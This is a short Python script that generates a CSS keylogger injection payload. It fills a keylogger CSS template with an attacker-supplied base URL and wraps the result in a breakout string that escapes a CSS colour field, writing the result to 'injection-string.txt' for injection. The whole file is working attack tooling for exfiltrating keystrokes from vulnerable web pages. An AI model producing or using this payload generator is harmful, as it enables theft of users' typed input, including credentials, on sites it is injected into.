import sys

def update_css_file(base_url):
    # Read the content of the template file
    try:
        with open("keylogger.template.css", "r") as template_file:
            css_content = template_file.read()
    except FileNotFoundError:
        print("Template file 'keylogger.template.css' not found.")
        return

    # Replace the placeholder URL with the provided BASE_URL
    updated_css_content = css_content.replace("http://localhost:3000", base_url)

    # Save the updated content to the first file (keylogger.css)
    with open("keylogger.css", "w") as output_file:
        output_file.write(updated_css_content)

    print(f"File 'keylogger.css' has been updated with the BASE_URL: {base_url}")

    # Format the final injection string
    injection_string = f"#FFFFFF;width:100%;height:100%;}} {updated_css_content} .pwned-by-css{{color: black"

    # Save the injection string (injection-string.txt)
    with open("injection-string.txt", "w") as payload_file:
        payload_file.write(injection_string)

    print(f"File 'injection-string.txt' has been created with the keylogger payload.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python make-css-keylogger.py <BASE_URL>")
    else:
        base_url = sys.argv[1]
        update_css_file(base_url)
